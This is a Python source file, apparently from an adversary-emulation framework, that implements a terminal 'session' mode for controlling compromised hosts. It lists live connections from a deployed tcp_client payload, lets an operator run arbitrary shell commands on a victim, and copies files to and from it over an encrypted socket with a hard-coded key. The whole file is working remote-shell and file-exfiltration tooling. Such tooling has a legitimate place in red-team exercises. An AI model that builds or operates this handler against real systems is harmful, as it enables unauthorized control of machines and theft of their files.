import os
import socket
import struct

from aioconsole import ainput
from cryptography.fernet import Fernet

from app.terminal.mode import Mode


class Session(Mode):

    def __init__(self, services, logger):
        super().__init__(services, logger)
        self.sessions = []
        self.addresses = []
        self.encryption_key = b'secretsecretsecretwbsecretsecretsecretsecre='

    async def execute(self, cmd):
        await self.execute_mode(cmd)

    async def info(self):
        print('SESSION allows you to view and enter compromised hosts')
        self.log.console('This mode requires the (stockpile) tcp_client.py payload to be deployed on a compromised host', 'blue')
        print('-> search: list all active sessions')
        print('-> pick [index]: jump into an active session')

    async def search(self):
        active = []
        for i, conn in enumerate(self.sessions):
            try:
                await self._send(conn, ' ')
                await self._receive(conn)
                active.append(dict(index=i, address=self.addresses[i]))
            except socket.error:
                del self.sessions[i]
                del self.addresses[i]
        self.log.console_table(active)

    async def pick(self, i):
        await self._send_target_commands(int(i.split(' ')[-1]))

    async def encrypt(self, message):
        f = Fernet(self.encryption_key)
        token = f.encrypt(message.encode('utf-8'))
        return token

    async def decrypt(self, cipher_text):
        f = Fernet(self.encryption_key)
        return f.decrypt(cipher_text)

    async def _send_target_commands(self, target):
        conn = self.sessions[target]
        await self._send(conn, ' ')
        self.log.console('Entered session - try "whoami"')

        while True:
            try:
                cwd = await self._receive(conn)
                print(cwd, end='')

                data = await ainput()
                cmd = self.parse_command(data)
                if not cmd:
                    data = ' '
                elif cmd == 'transfer':
                    """
                    put	Copy a file from the local computer to the remote host. 'put localFile remoteFile' 
                    get	Copy a file from the remote host to the local computer. 'get remoteFile localFile'
                    """
                    transfer_command = [arg for arg in data.split(' ') if arg]
                    if len(transfer_command) != 4 or transfer_command[1] not in ['get', 'put']:
                        print('command should be of form \'transfer get|put remoteFile|localFile localFile|remoteFile\'\n')
                        data = ' '
                    elif transfer_command[1] == 'get':
                        await self._send(conn, data)
                        file_data = await self._receive(conn)
                        local_file = transfer_command[3]
                        with open(local_file, 'w+') as f:
                            f.write(file_data)
                        continue
                    elif transfer_command[1] == 'put':
                        local_file = transfer_command[2]
                        if not os.path.exists(local_file):
                            print('local file does not exist\n')
                        else:
                            with open(local_file, 'r') as f:
                                file_data = f.read()
                            await self._send(conn, data)
                            data = file_data
                elif cmd == 'background':
                    print('\n')
                    break

                await self._send(conn, data)
                client_response = await self._receive(conn)
                print(client_response, end='')

            except Exception as e:
                self.log.console('Connection was dropped ' + str(e), 'red')
                break

    async def _send(self, conn, msg):
        cipher_text = await self.encrypt(msg)
        conn.send(struct.pack('>I', len(cipher_text)) + cipher_text)

    async def _receive(self, conn):
        raw_msg_len = await self._recvall(conn, 4)
        if not raw_msg_len:
            return None
        msg_len = struct.unpack('>I', raw_msg_len)[0]
        cipher_text = await self._recvall(conn, msg_len)
        output = await self.decrypt(cipher_text)
        return str(output, 'utf-8')

    @staticmethod
    async def _recvall(conn, n):
        data = b''
        while len(data) < n:
            packet = conn.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    @staticmethod
    def parse_command(data):
        if not data.strip():
            return None
        return data.partition(' ')[0]
